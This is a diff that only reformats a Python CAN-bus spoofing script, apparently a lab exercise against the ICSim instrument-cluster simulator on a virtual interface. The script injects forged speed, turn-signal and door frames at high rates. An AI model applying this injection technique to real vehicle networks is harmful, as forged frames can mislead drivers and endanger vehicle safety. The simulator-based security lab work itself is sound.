@@ -22,15 +22,16 @@ IDs do ICSim (do zombieCraig/ICSim):
     python3 04_spoofing_attack.py --iface vcan0 --target doors \\
             --value 0x0F --duration 30
 """
+
 import argparse
 import sys
 import time
 import can
 
 # IDs do ICSim
-ID_SPEED   = 0x244
-ID_SIGNAL  = 0x188
-ID_DOORS   = 0x19B
+ID_SPEED = 0x244
+ID_SIGNAL = 0x188
+ID_DOORS = 0x19B
 
 
 def build_speed_frame(kmh: int) -> can.Message:
@@ -39,36 +40,52 @@ def build_speed_frame(kmh: int) -> can.Message:
     payload = bytearray(8)
     payload[3] = raw & 0xFF
     payload[4] = (raw >> 8) & 0xFF
-    return can.Message(arbitration_id=ID_SPEED, data=bytes(payload),
-                       is_extended_id=False)
+    return can.Message(
+        arbitration_id=ID_SPEED, data=bytes(payload), is_extended_id=False
+    )
 
 
 def build_signal_frame(left: bool, right: bool) -> can.Message:
     payload = bytearray(8)
     payload[2] = (0x01 if right else 0) | (0x02 if left else 0)
-    return can.Message(arbitration_id=ID_SIGNAL, data=bytes(payload),
-                       is_extended_id=False)
+    return can.Message(
+        arbitration_id=ID_SIGNAL, data=bytes(payload), is_extended_id=False
+    )
 
 
 def build_doors_frame(mask: int) -> can.Message:
     payload = bytearray(8)
     payload[2] = mask & 0x0F
-    return can.Message(arbitration_id=ID_DOORS, data=bytes(payload),
-                       is_extended_id=False)
+    return can.Message(
+        arbitration_id=ID_DOORS, data=bytes(payload), is_extended_id=False
+    )
 
 
 def parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser(description="Spoofing direcionado em ICSim")
     p.add_argument("--iface", default="vcan0")
-    p.add_argument("--target", choices=["speed", "signals", "doors"],
-                   required=True, help="ECU virtual a ser falsificada")
-    p.add_argument("--value", type=lambda x: int(x, 0), default=0,
-                   help="Valor a injetar (km/h para speed, máscara para doors)")
-    p.add_argument("--pattern", choices=["fixed", "flicker"], default="fixed",
-                   help="Padrão para setas: fixed ou flicker")
+    p.add_argument(
+        "--target",
+        choices=["speed", "signals", "doors"],
+        required=True,
+        help="ECU virtual a ser falsificada",
+    )
+    p.add_argument(
+        "--value",
+        type=lambda x: int(x, 0),
+        default=0,
+        help="Valor a injetar (km/h para speed, máscara para doors)",
+    )
+    p.add_argument(
+        "--pattern",
+        choices=["fixed", "flicker"],
+        default="fixed",
+        help="Padrão para setas: fixed ou flicker",
+    )
     p.add_argument("--duration", type=float, default=30.0)
-    p.add_argument("--rate", type=float, default=1.0,
-                   help="Intervalo entre injeções em ms")
+    p.add_argument(
+        "--rate", type=float, default=1.0, help="Intervalo entre injeções em ms"
+    )
     return p.parse_args()
 
 
@@ -77,8 +94,10 @@ def main() -> None:
     bus = can.interface.Bus(channel=args.iface, interface="socketcan")
     interval_s = args.rate / 1000.0
 
-    print(f"[INFO] Spoofing alvo={args.target} | valor={args.value} | "
-          f"duração={args.duration}s | intervalo={args.rate}ms")
+    print(
+        f"[INFO] Spoofing alvo={args.target} | valor={args.value} | "
+        f"duração={args.duration}s | intervalo={args.rate}ms"
+    )
 
     sent = 0
     flicker_state = False
@@ -96,8 +115,9 @@ def main() -> None:
                     flicker_state = not flicker_state
                     msg = build_signal_frame(flicker_state, not flicker_state)
                 else:
-                    msg = build_signal_frame(bool(args.value & 0x02),
-                                             bool(args.value & 0x01))
+                    msg = build_signal_frame(
+                        bool(args.value & 0x02), bool(args.value & 0x01)
+                    )
             try:
                 bus.send(msg)
                 sent += 1
@@ -110,9 +130,11 @@ def main() -> None:
     finally:
         elapsed = time.perf_counter() - t0
         bus.shutdown()
-        print(f"[RESULTADO] Frames spoofados: {sent} | "
-              f"Tempo: {elapsed:.3f}s | "
-              f"Taxa média: {sent/elapsed:.0f} fps")
+        print(
+            f"[RESULTADO] Frames spoofados: {sent} | "
+            f"Tempo: {elapsed:.3f}s | "
+            f"Taxa média: {sent/elapsed:.0f} fps"
+        )
 
 
 if __name__ == "__main__":
